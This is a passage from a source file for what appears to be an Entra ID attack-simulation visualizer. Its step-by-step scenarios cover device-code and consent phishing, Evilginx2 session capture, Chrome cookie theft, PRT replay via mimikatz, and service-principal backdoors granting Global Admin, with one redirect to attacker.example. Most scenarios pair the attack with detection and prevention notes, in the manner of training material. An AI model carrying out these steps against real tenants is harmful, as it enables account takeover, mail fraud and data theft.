    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "poll /token"),
  },
  {
    logMessage: "Entra ID: Links Alice's completed auth session to the device_code. Attacker's next successful poll returns { access_token (MS Graph, about 1h), refresh_token if offline_access was granted, id_token if openid was requested }. For non-SPA public clients, refresh tokens default to 90 days but can be revoked earlier by user/admin action, CA/session controls, or risk enforcement.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (alice, 90d)"); },
  },
  {
    logMessage: "Attacker: refresh_token has offline_access scope and is bound to the user+client, not one resource. Redeeming it can silently issue new access/refresh token pairs for permitted resources; old refresh tokens are not automatically revoked on use, so incident response must explicitly revoke sessions/tokens.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /me, /users (90d)"),
  },
  {
    logMessage: "DETECTION: Entra sign-in logs can be filtered by authentication protocol = Device code flow, then reviewed for unusual IP, location, client app, user agent, and impossible-travel patterns. Authentication-flow CA uses protocol tracking, so a session that began with device code flow can remain subject to that policy during later token refreshes.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "PREVENTION: Use Conditional Access authentication flows to block device code flow broadly and allow it only for documented device classes, locations, or legacy tooling that genuinely needs it. Combine with phishing-resistant MFA, consent governance, sign-in risk policy, and rapid refresh-token/session revocation playbooks.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Attacker receives real tokens from the victim's completed sign-in without touching the victim endpoint. The flow inherits whatever controls the victim satisfied during that legitimate authentication, which is why it remains effective unless the tenant explicitly restricts device code flow or revokes the resulting sessions.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 5b. M365 Business Email Compromise via Graph / Exchange ──────
export const entraM365BECScenario = [
  {
    scenarioName: "Attack: M365 Business Email Compromise (Graph Mail + Inbox Rules)",
    logMessage: "Attacker Goal: Turn a compromised Microsoft 365 mailbox session into business email compromise: read sensitive mail, create stealthy forwarding rules, send believable messages, and identify when higher privileges are needed for tenant-wide mail access.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Starting point: attacker has Alice's delegated session from device-code phishing, AITM, consent phishing, or password compromise. The token is not an admin token; it only carries Alice's delegated permissions and whatever scopes were issued to the client.",
    logType: "setup",
    action: () => highlightElement("ent_user1", undefined, "compromised"),
  },
  {
    logMessage: "Mail reconnaissance: GET https://graph.microsoft.com/v1.0/me/messages?$select=subject,from,receivedDateTime,bodyPreview. Delegated Mail.Read or Mail.ReadBasic can expose mailbox contents for the signed-in user; application-wide Mail.Read would require admin consent and should be treated as a much higher severity finding.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "GET /me/messages"),
  },
  {
    logMessage: "Target selection: attacker searches for finance, invoice, bank, payroll, wire, supplier, and executive conversation threads. The goal is not directory compromise yet; it is context theft for a believable payment-diversion or reply-chain attack.",
    logType: "attack",
    action: () => highlightElement("ent_m365"),
  },
  {
    logMessage: "Inbox rule abuse: POST /me/mailFolders/inbox/messageRules with delegated MailboxSettings.ReadWrite creates a rule named 'Invoice Processing'. Conditions match subjects containing invoice, finance, banking, or accounting. Actions forward or redirect matching messages, mark them read, and optionally move them to a low-visibility folder.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "POST messageRules"),
  },
  {
    logMessage: "2026 forwarding caveat: Creating an inbox rule and successfully delivering externally are separate controls. Exchange Online outbound spam policy and tenant settings can block automatic external forwarding, while Defender can raise suspicious email forwarding alerts. Internal forwarding or hidden mailbox movement can still be abused for staging.",
    logType: "info",
    action: () => highlightElement("ent_m365"),
  },
  {
    logMessage: "Delegated sending: POST /me/sendMail with delegated Mail.Send lets the attacker send as Alice through Graph. If tenant user consent permits Mail.Send, a compromised user can often authorize this for their own mailbox; stricter tenants require admin approval or pre-approved apps.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "POST /me/sendMail"),
  },
  {
    logMessage: "Send-as boundary: Sending as another mailbox is not granted by Alice's token alone. It requires Exchange mailbox permissions such as Send As or Send on behalf, or application permissions with admin consent. A normal compromised mailbox can abuse its own identity; tenant-wide impersonation requires privilege escalation.",
    logType: "info",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_admin"); },
  },
  {
    logMessage: "Admin-privileged variant: if the attacker compromises an Exchange Administrator, Global Administrator, or app with mail application permissions, they can add mailbox delegation, grant Send As, enumerate many mailboxes, or consent to application Mail.Read/Mail.Send. This shifts from single-mailbox BEC to tenant-wide mail compromise.",
    logType: "attack",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "admin mail permissions"); },
  },
  {
    logMessage: "Purview/eDiscovery variant: Microsoft Purview eDiscovery can search and export Exchange Online, Teams, SharePoint, and OneDrive content, but the user must be assigned appropriate eDiscovery role-group permissions. Adding a user to eDiscovery Manager or Administrator is an admin-level action and should be audited separately.",
    logType: "info",
    action: () => addTemporaryEdge("ent_admin", "ent_m365", "msgraph", "Purview eDiscovery access"),
  },
  {
    logMessage: "Detection: correlate Entra sign-ins, OAuth consent grants, Graph mail reads, mailbox audit events, new or modified inbox rules, external auto-forward attempts, unusual sent-mail volume, and Purview role/case/export activity. Defender for Office 365 and Defender XDR can surface suspicious forwarding and mailbox abuse.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: One user token can be enough for real BEC: sensitive email discovery, invoice-thread hijacking, forwarding rules, and deceptive messages from the victim's mailbox. Tenant controls determine whether it remains a single-mailbox incident or expands into cross-mailbox and compliance-search compromise.",
    logType: "success",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_m365"); },
  },
];

// ── 6. AITM via Evilginx2 ─────────────────────────────────────────
export const entraAITMScenario = [
  {
    scenarioName: "Attack: Adversary-in-the-Middle (AITM) — Evilginx2 Token Capture",
    logMessage: "Attacker Goal: Capture Entra ID session cookies and tokens via reverse-proxy AITM — full MFA bypass by sitting between victim and Entra ID, intercepting the post-MFA authenticated session.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker deploys Evilginx2 on VPS. Phishlet targets login.microsoftonline.com. Attacker domain: 'login.m1crosoft-corp.com' (typosquat). Valid Let's Encrypt TLS cert issued. Phishlet capture config: cookies=[ESTSAUTH, ESTSAUTHPERSISTENT, x-ms-RefreshTokenCredential]. All traffic bidirectionally proxied.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker → Alice (spear phish): 'Your Entra ID token requires re-authentication.' Link: https://login.m1crosoft-corp.com/corp.onmicrosoft.com/oauth2/v2.0/authorize?... Browser shows valid HTTPS padlock — real TLS cert on attacker domain. No browser warnings.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
  {
    logMessage: "Alice → Evilginx2 proxy → real login.microsoftonline.com. Proxy transparently forwards all requests/responses. Alice sees genuine Entra login UI served through the proxy. Enters credentials + approves MFA push (real prompts, real Authenticator notification).",
    logType: "http",
    action: () => { addTemporaryEdge("ent_user1", "ent_attacker", "http", "→ AITM proxy"); addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "forwarded auth"); },
  },
  {
    logMessage: "Entra ID: Auth complete. Issues session cookies to 'Alice's browser' (actually Evilginx2). Evilginx2 intercepts Set-Cookie headers before forwarding to victim: captures ESTSAUTH (current session JWT, ~1h), ESTSAUTHPERSISTENT (persistent session, up to 90d), x-ms-RefreshTokenCredential.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "ESTS cookies captured"),
  },
  {
    logMessage: "Attacker imports ESTSAUTH + ESTSAUTHPERSISTENT into browser via Cookie-Editor extension. Navigates to portal.azure.com, outlook.office.com, teams.microsoft.com — fully authenticated as Alice. Session cookie IS the session — no token exchange needed.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "cookie replay (ESTS)"); },
  },
  {
    logMessage: "Attacker: Uses session cookie context to silently acquire OAuth2 tokens — POST /oauth2/v2.0/token (cookie-based auth) → access_token (MS Graph, 1h) + refresh_token. Now has both browser session AND API-level access. Entra sees requests matching Alice's session fingerprint — no anomaly triggered.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "token extract (cookie)"),
  },
  {
    logMessage: "DETECTION: Entra ID P2 'Token anomaly' risk event: access_token presented from different IP/device than issuance. CAE (Continuous Access Evaluation) can revoke tokens in near-real-time if IP change is significant. ESTSAUTHPERSISTENT from matching geolocation VPS may evade both. Sign-in risk: 'Anomalous token' detection available in P2.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Full MFA bypass — victim completed real MFA but attacker captured the post-MFA session. ESTSAUTHPERSISTENT valid up to 90 days. Both browser and API access captured simultaneously. Works against any Entra tenant — no tenant-side configuration required. Phishing-resistant MFA (FIDO2/WHfB) is the only reliable defense: these credentials are device-bound and cannot be proxied.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 7b. Pass-the-Cookie (Local Endpoint ESTS Cookie Theft) ────────
export const entraPassTheCookieScenario = [
  {
    scenarioName: "Attack: Pass-the-Cookie (Local ESTS Cookie Theft from Chrome)",
    logMessage: "Attacker Goal: On a compromised Windows endpoint, extract the ESTSAuth / ESTSAuthPersistent session cookies that Chrome stores after a user authenticates to Entra ID, then replay them from an attacker machine to access M365 services as the victim — bypassing MFA without a proxy.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has local admin or user-level code execution on victim's Windows workstation (ent_dev1) where the user is signed into Chrome with an active Entra ID / M365 session. No SYSTEM privilege required — cookies are user-scoped.",
    logType: "setup",
    action: () => highlightElement("ent_dev1", stepDelay, "compromised"),
  },
  {
    logMessage: "Target cookies: ESTSAuth (~24h, session-scoped, cleared on browser close) and ESTSAuthPersistent (~90d, set when 'Keep me signed in' is selected). Both reside in Chrome's SQLite cookie store: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies. ESTSAuthPersistent is the high-value target — 90 days of access without re-authentication.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Chrome App-Bound Encryption (Chrome 127+, July 2024): cookies are now dual-encrypted — AES-GCM key from %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State is itself encrypted with both user DPAPI and a SYSTEM-level key tied to Chrome's app identity (IElevator COM service). The 2023 chromedumpbin.nim / Local State + DPAPI approach is broken against Chrome 127+.",
    logType: "info",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "2026 extraction path — three viable approaches: (1) Chrome DevTools Protocol: launch Chrome headless with --remote-debugging-port, call Network.getCookies via CDP — Chrome decrypts in-process on the attacker's behalf. (2) IElevator COM injection: call Google Chrome Elevation Service's DecryptData method (requires same user context, COM interface exposed on named pipe). (3) Process memory injection: inject into a running Chrome renderer and read decrypted cookie values from V8 heap — no file access needed. Tools: xaitax/Chrome-App-Bound-Encryption-Decryption, SharpChrome (updated), DumpBrowserSecrets.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Attacker exfiltrates decrypted ESTSAuth + ESTSAuthPersistent values. No file copy needed if using in-process method. Alternatively, exfil the Cookies SQLite file + Local State and decrypt offline on attacker machine (only works against Chrome ≤126; Chrome 127+ offline decryption blocked by SYSTEM-bound key unless attacker also has SYSTEM).",
    logType: "attack",
    action: () => addTemporaryEdge("ent_dev1", "ent_attacker", "http", "ESTS cookies exfil"),
  },
  {
    logMessage: "Attacker: Opens incognito Chrome session → login.microsoftonline.com → DevTools (F12) → Application → Cookies → create ESTSAuth + ESTSAuthPersistent with HTTPOnly flag. Refresh page → authenticated as victim. MFA state carried inside the cookie — no second factor prompted.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "ESTS cookie replay"),
  },
  {
    logMessage: "Entra ID validates the ESTS cookie — session is presented as originating from the original device (user-agent and IP may differ; Entra does not enforce device-binding on ESTS cookies unless Token Protection policy is active). Access tokens for MS Graph, Exchange, SharePoint, Teams obtained via cookie-authenticated POST /oauth2/v2.0/token.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "access + refresh tokens"); },
  },
  {
    logMessage: "Attacker accesses Outlook (mail/calendar exfil), SharePoint (document theft), Teams (communications), Azure portal (if user has Azure RBAC). Refresh token obtained from cookie session enables 14-day access without re-authentication.",
    logType: "msgraph",
    action: () => { highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "M365 access"); },
  },
  {
    logMessage: "DEFENSE: Token Protection (Entra CA) — cryptographically binds ESTS tokens to the originating device; replaying from a different device fails the PoP challenge. Sign-in Frequency CA policy forces re-auth after N hours, limiting ESTSAuthPersistent window. CAE (Continuous Access Evaluation) revokes sessions in near-real-time on IP change or user disable. EDR detection: Chrome CDP --remote-debugging-port launch, IElevator COM interface calls, and Chrome process injection are all highly detectable via process creation and network telemetry.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: MFA bypass on a compromised endpoint without a phishing proxy. ESTSAuthPersistent gives 90 days of silent M365 access. Chrome App-Bound Encryption raises the bar (requires CDP/COM/injection) but does not eliminate extraction for an attacker with user-level execution. Device-bound Token Protection is the only hard control; widely undeployed.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  TOKEN & SESSION ATTACKS
// ══════════════════════════════════════════════════════════════════

// ── 7. Pass-the-PRT ──────────────────────────────────────────────
export const entraPassThePRTScenario = [
  {
    scenarioName: "Attack: Pass-the-PRT (Primary Refresh Token Theft)",
    logMessage: "Attacker Goal: Extract PRT from LSASS on a compromised Entra-joined device and replay it from an attacker machine to acquire tokens that carry full device compliance + MFA claims, bypassing all Conditional Access controls.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has SYSTEM on LAPTOP-01 (ent_dev1) — Alice's Entra-joined, Intune-compliant, WHfB-enrolled device. Device does NOT have CloudAP lockdown (Credential Guard for cloud credentials) enabled.",
    logType: "setup",
    action: () => highlightElement("ent_dev1", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker (SYSTEM on LAPTOP-01): mimikatz 'token::elevate' + 'sekurlsa::cloudap' → reads CloudAP cache from LSASS. PRT blob present (encrypted with device transport key). Session key wrapped with TPM transport key — TPM-sealed, not directly extractable.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "TPM blocks session key extraction: WHfB private key and session key decryption key live in TPM 2.0 hardware — TPM2_RSA_Decrypt requires local TPM authorization. Attacker pivots to live PRT cookie technique: sign a nonce with session key WHILE STILL on the device (TPM will execute signing for any SYSTEM process).",
    logType: "tpm",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Attacker: ROADtoken / AADInternals: Get-AADIntUserPRTToken → calls CloudAP COM interface (ICloudAPCredentialProvider) to construct and sign a PRT cookie (JWT with session key HMAC over server nonce). Returns x-ms-RefreshTokenCredential header value valid for ~60s.",
    logType: "prt",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Attacker exfiltrates signed PRT cookie. Replays via Chrome DevTools Protocol on attacker machine: inject x-ms-RefreshTokenCredential header into request to login.microsoftonline.com/common/oauth2/v2.0/token. PRT cookie is time-bound but can be re-signed repeatedly while SYSTEM persists on device.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_dev1", "ent_attacker", "prt", "PRT cookie exfil"),
  },
  {
    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/token with x-ms-RefreshTokenCredential: <signed_PRT_cookie>. Entra ID: validates PRT reference, verifies session key HMAC over nonce, confirms device_id binding (LAPTOP-01, Intune-compliant).",
    logType: "prt",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "prt", "PRT cookie replay"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (1h, amr=ngcmfa, deviceid=LAPTOP-01, intuneMDMCompliant=true), refresh_token (14d) }. Token carries Alice's full WHfB MFA + device compliance claims. ALL CA policies satisfied — attacker bypasses every conditional access control.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (ngcmfa + compliant)"); },
  },
  {
    logMessage: "Attacker: Accesses SharePoint, Exchange, Teams, Azure portal — all CA checks pass (compliant device_id in token, ngcmfa amr). Even policies requiring 'require compliant device' or 'require MFA' satisfied by stolen token claims.",
    logType: "msgraph",
    action: () => { highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "full M365 access"); },
  },
  {
    logMessage: "DEFENSE: Microsoft Entra Token Protection (GA 2024) — CA policy 'Require token protection' binds issued tokens to the device asymmetric key via a signed PoP challenge on every use. Attacker machine lacks LAPTOP-01's TPM private key and cannot satisfy PoP challenges, rendering stolen tokens non-replayable. Also: Continuous Access Evaluation (CAE) with IP location enforcement revokes tokens on IP change; Sign-in Frequency policy limits refresh token lifetime. Session-gap risk: a PRT cookie re-signed repeatedly on the compromised device can outlive CAE revocation events if the attacker maintains SYSTEM persistence — revoke device registration in Entra ID to invalidate all issued PRTs for that device.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Hardest Entra attack — requires initial device compromise. Reward: tokens inheriting all CA compliance claims of the victim's enrolled device. 14-day refresh token gives continuous access. Identical post-auth state to a legitimate WHfB sign-in from LAPTOP-01.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 8. Consent Phishing ──────────────────────────────────────────
export const entraConsentPhishingScenario = [
  {
    scenarioName: "Attack: Consent Phishing — Malicious OAuth2 App Registration",
    logMessage: "Attacker Goal: Gain delegated access to victim M365 data by tricking a user or admin into granting OAuth2 consent to a malicious multi-tenant app. No password is stolen; the attacker receives OAuth tokens for whatever scopes were approved.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Tenant consent policy controls success: many tenants restrict user consent to verified publishers and low-risk permissions, or require admin approval for any consent grant. The attack succeeds where policy allows the requested scopes or an admin can be socially engineered into approving them.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Attacker pre-stages: registers malicious app in a separate attacker-controlled Entra tenant. App config: displayName='Office Read', signInAudience=AzureADMultipleOrgs, redirect_uri=https://attacker.example/gettoken, requested delegated scopes: openid profile offline_access User.Read Mail.Read Mail.Send.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker sends OAuth phish to Alice: 'Approve Office Read to finish mailbox migration.' Link: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<malicious>&response_type=code&redirect_uri=https://attacker.example/gettoken&scope=openid+profile+offline_access+User.Read+Mail.Send.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
  {
    logMessage: "Alice clicks → Entra ID renders consent prompt for the malicious app. Because Mail.Send can be user-consentable in permissive tenants, Alice clicks Accept. Entra creates oauth2PermissionGrant with consentType=Principal for Alice only.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_user1", "ent_tenant", "oidc", "user consent"),
  },
  {
    logMessage: "Entra ID redirects authorization code to attacker redirect URI. Attacker exchanges it: POST /oauth2/v2.0/token { grant_type=authorization_code, client_id, client_secret, code, redirect_uri }. Result: delegated access_token plus refresh_token for Alice's approved scopes.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "auth_code -> tokens"); },
  },
  {
    logMessage: "Attacker uses Graph with Alice's delegated token: POST /v1.0/me/sendMail, GET /v1.0/me/messages, or whatever scopes Alice approved. MFA and password secrecy are not bypassed retroactively; Alice completed a real Microsoft consent flow that issued tokens to the attacker's app.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "Alice delegated Graph access"),
  },
  {
    logMessage: "Admin escalation variant: if EntraAdmin approves 'Accept on behalf of your organization', Entra creates tenant-wide consentType=AllPrincipals. This does not mint delegated tokens for arbitrary users by itself, but it suppresses future prompts and can grant application permissions where admin consent approved app-only access.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_admin", "ent_tenant", "oidc", "optional admin consent"),
  },
  {
    logMessage: "DETECTION: Entra audit logs show 'Consent to application' and 'Add delegated permission grant'. Defender for Cloud Apps / App Governance can surface risky OAuth apps, misleading names/publishers, suspicious scopes, and anomalous Graph activity. Hunt /oauth2PermissionGrants and servicePrincipals for unknown publisher apps.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: OAuth foothold independent of stolen passwords. The attacker owns the consenting user's delegated data until tokens are revoked or expire under tenant controls, and an admin-approved app can become a durable tenant-wide persistence mechanism if application permissions are granted.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  PRIVILEGE ESCALATION
// ══════════════════════════════════════════════════════════════════

// ── 9. Add Credentials to App Registration ───────────────────────
export const entraAppCredAbuseScenario = [
  {
    scenarioName: "Attack: Add Credentials to App Registration (Service Principal Backdoor)",
    logMessage: "Attacker Goal: Add a new client secret to a high-privilege app registration, then authenticate as that service principal to perform privileged directory operations — no user account required, no MFA.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has compromised EntraAdmin session (token with Application Administrator or higher role). Target: AppReg-01 (ent_svc) has Application Permission 'RoleManagement.ReadWrite.Directory' — can assign any Entra role to any principal.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", stepDelay, "compromised"); highlightElement("ent_svc"); },
  },
  {
    logMessage: "Attacker → MS Graph (as EntraAdmin): POST /v1.0/applications/{appReg01_objectId}/addPassword { passwordCredential: { displayName: 'sync-svc-2024', endDateTime: '2027-12-31T00:00:00Z' } }. Adds new client secret — existing secrets untouched, app functionality uninterrupted.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /applications/addPassword"),
  },
  {
    logMessage: "MS Graph → Attacker: 200 OK { keyId: 'f3a9...', hint: 'syn', secretText: 'Abc8Q~xyz...28b' }. secretText returned ONLY at creation time — never retrievable via Graph again. Attacker stores it. App now has two valid secrets: original (owners unaware) + new backdoor.",
    logType: "attack",
    action: () => highlightElement("ent_svc", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/token { grant_type=client_credentials, client_id=<AppReg-01_appId>, client_secret=<new_backdoor_secret>, scope=https://graph.microsoft.com/.default }. Application-context authentication — no user, no MFA, no CA interactive policy.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "client_credentials (SP)"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (JWT, 1h, roles=[RoleManagement.ReadWrite.Directory], oid=<AppReg-01 SP>, appid, tid) }. Application permission token — roles claim contains app roles granted, not user wids. Silently refreshable every hour indefinitely.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP access_token (app roles)"),
  },
  {
    logMessage: "Attacker → MS Graph (as AppReg-01 SP): POST /v1.0/roleManagement/directory/roleAssignments { principalId: <attacker_new_SP_objectId>, roleDefinitionId: '62e90394-69f5-4237-9190-012177145e10' (GlobalAdministrator), directoryScopeId: '/' }. Permanent standing GA assignment — bypasses PIM entirely.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /roleAssignments (GA)"),
  },
  {
    logMessage: "Entra ID: Role assignment created. Attacker-controlled service principal is now a standing Global Administrator. New client_credentials tokens authorize privileged directory operations through the service principal itself, with no user account or MFA anywhere in the loop.",
    logType: "attack",
    action: () => { highlightElement("ent_tenant", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "GA app token"); },
  },
  {
    logMessage: "DETECTION: Entra Audit Log event 'Update application — Add password credentials' is high signal. Any credential addition to an existing app should trigger an immediate alert. Microsoft Defender for Cloud Apps: App governance policy 'Alert on new credential added to app with sensitive permissions'. Identity Secure Score: 'App admins should not be Global Admins'.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Fully autonomous persistent backdoor. Client secret survives: user password resets, MFA changes, account disables, PIM deactivations, CA policy updates. No interactive sign-in — fully headless. Root cause: RoleManagement.ReadWrite.Directory application permission is a direct Global Admin escalation primitive.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ── 9b. Cloud Application Administrator → Azure RBAC via App Credential ─────
export const entraCloudAppAdminSpRbacScenario = [
  {
    scenarioName: "Attack: Cloud App Admin → Service Principal Contributor Pivot",
    logMessage: "Attacker Goal: Abuse a compromised Cloud Application Administrator account to add credentials to an application whose service principal already has Azure RBAC Contributor on a subscription. The app becomes a bridge from Entra application administration into Azure resource control.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Sombra's compromised session. Sombra is Cloud Application Administrator, but has no Azure RBAC role on the production subscription. AppReg-01 represents the target app; its service principal already has Contributor on the subscription.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_svc"); },
  },
  {
    logMessage: "Recon: AzureHound / Graph identifies AppReg-01 as an app registration with an enterprise app service principal that has Azure RBAC Contributor. The attack path is not 'Cloud App Admin can manage VMs'; it is 'Cloud App Admin can impersonate an app identity that can manage VMs'.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Find app -> SP -> RBAC"),
  },
  {
    logMessage: "Attacker adds themselves as app owner for operational cover: az ad app owner add --id <app_object_or_client_id> --owner-object-id <sombra_object_id>. Microsoft Graph equivalent: POST /v1.0/applications/{id}/owners/$ref.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Add app owner"),
  },
  {
    logMessage: "Attacker adds a client secret to the application: POST /v1.0/applications/{id}/addPassword { passwordCredential: { displayName: 'overwatch-sync', endDateTime: '2027-12-31T00:00:00Z' } }. Azure CLI equivalent remains az ad app credential reset or az ad sp credential reset, depending on whether targeting the application or service principal object.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "addPassword"); },
  },
  {
    logMessage: "Entra ID returns the new secret once. Attacker authenticates as the service principal: az login --service-principal --username <appId> --password <newSecret> --tenant <tenantId>. No user MFA or Conditional Access user session is involved; this is client credentials flow.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP token (client credentials)"),
  },
  {
    logMessage: "Using the SP's Azure RBAC Contributor role, attacker calls ARM: GET /subscriptions/{subId}/resources and starts managing resource groups, VMs, storage accounts, and databases. Contributor can manage resources but cannot grant Azure RBAC access unless it also has roleAssignments/write.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Contributor on subscription"),
  },
  {
    logMessage: "Azure resource impact: attacker reads Key Vault secrets or storage data when the SP has suitable data-plane roles or when resources still trust access policies/keys exposed to Contributor-controlled management operations. The Cloud App Admin account itself never needed direct subscription access.",
    logType: "azurerm",
    action: () => { highlightElement("ent_kv", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Resource control via SP"); },
  },
  {
    logMessage: "Detection: Entra audit logs show 'Add owner to application' and 'Add password credentials' or 'Update application'. Azure sign-in logs show service principal sign-ins from new IPs, followed by Azure Activity Log operations by that appId. Correlate app credential changes with sudden ARM activity.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: A directory role intended for app administration becomes Azure subscription compromise when application identities are over-privileged. Mitigate by separating app administration from Azure resource ownership, using workload identity federation or short-lived credentials, alerting on new app credentials, and reviewing Azure RBAC assignments for service principals.",
    logType: "success",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_kv"); },
  },
];

// ── 9bb. Azure Key Vault Secret Theft and Access Policy Abuse ─────
export const entraKeyVaultAbuseScenario = [
  {
    scenarioName: "Attack: Azure Key Vault Secret Theft and Access Grant Abuse",
    logMessage: "Attacker Goal: Use a compromised Azure user, service principal, managed identity, or automation identity to enumerate Key Vaults, read secret names and values, and create a durable path back into the vault by abusing Azure RBAC or legacy access policies.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Key Vault authorization model: Azure RBAC is the recommended model and the default for new vaults. Existing vaults retain their access policy model unless explicitly migrated — legacy access-policy abuse remains relevant wherever old vaults are still in production.",
    logType: "info",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "Starting point: attacker has Sombra's Azure session. The identity can see the Sintra resource group and has either Key Vault data-plane permissions or control-plane rights that can be converted into data-plane access.",
    logType: "setup",
    action: () => highlightElement("ent_user1", undefined, "compromised"),
  },
  {
